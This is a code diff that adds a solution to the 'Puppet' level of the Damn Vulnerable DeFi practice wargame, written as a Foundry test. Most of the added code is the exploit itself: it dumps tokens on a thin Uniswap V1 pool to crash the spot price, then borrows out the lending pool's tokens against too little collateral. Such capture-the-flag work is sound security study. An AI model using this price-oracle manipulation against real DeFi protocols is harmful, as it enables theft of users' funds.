@@ -3,6 +3,7 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
+import "forge-std/console2.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {PuppetPool} from "../../../src/Contracts/puppet/PuppetPool.sol";
@@ -34,7 +35,7 @@ interface UniswapV1Factory {
     function createExchange(address token) external returns (address);
 }
 
-contract Puppet is Test {
+contract PuppetV1 is Test {
     // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
     uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
     uint256 internal constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
@@ -119,6 +120,49 @@ contract Puppet is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        vm.startPrank(attacker);
+
+        dvt.approve(address(uniswapExchange), type(uint256).max);
+        uint256 amountOfEthICanGet = uniswapExchange.getTokenToEthInputPrice(dvt.balanceOf(attacker));
+        console2.log("Starting the level with %s ETH", address(attacker).balance);
+        console2.log("Can get %s ETH selling initial dvt tokens", amountOfEthICanGet);
+        
+        // Dump all the dvt tokens on the exchange
+        uniswapExchange.tokenToEthSwapInput(dvt.balanceOf(attacker), amountOfEthICanGet, block.timestamp + 1);
+        console2.log("Now have %s ETH after 0 loop", address(attacker).balance);
+
+        // Lever up using the ETH I just got and the new price
+
+        // ------------------- First loop -----------------------
+
+        // We compute the amount we can borrow based on the current price
+        uint256 priceInEthPerToken = (address(uniswapExchange).balance * 1e18) / dvt.balanceOf(address(uniswapExchange));
+        uint256 ethRequired = address(attacker).balance;
+        uint256 borrowAmount = ethRequired / (priceInEthPerToken * 2) * 1e18;
+        borrowAmount = (borrowAmount <= dvt.balanceOf(address(puppetPool))) ? borrowAmount : dvt.balanceOf(address(puppetPool));
+        ethRequired = borrowAmount * priceInEthPerToken * 2 / 1e18;
+        console2.log("Can borrow %s tokens using %s wei", borrowAmount, ethRequired);
+
+        puppetPool.borrow{value: ethRequired}(borrowAmount);
+        console2.log("Now have %s ETH after 1 loop, puppetPool has %s tokens, I have %s tokens", address(attacker).balance, dvt.balanceOf(address(puppetPool)), dvt.balanceOf(attacker));
+
+
+
+        // ------------------- Second loop -----------------------
+
+        // priceInEthPerToken = (address(uniswapExchange).balance) / dvt.balanceOf(address(uniswapExchange));
+        // borrowAmount = address(attacker).balance / (priceInEthPerToken * 2);
+        // console2.log("Can borrow %s tokens using %s wei", borrowAmount, address(attacker).balance);
+
+        // puppetPool.borrow{value: address(attacker).balance}(borrowAmount);
+        // amountOfEthICanGet = uniswapExchange.getTokenToEthInputPrice(dvt.balanceOf(attacker));
+        // uniswapExchange.tokenToEthSwapInput(dvt.balanceOf(attacker), amountOfEthICanGet, block.timestamp + 1);
+        // console2.log("Now have %s ETH after 2 loops, puppetPool has %s tokens", address(attacker).balance, dvt.balanceOf(address(puppetPool)));
+
+
+        console2.log("Finishing the level with %s ETH", address(attacker).balance / 1e18);
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
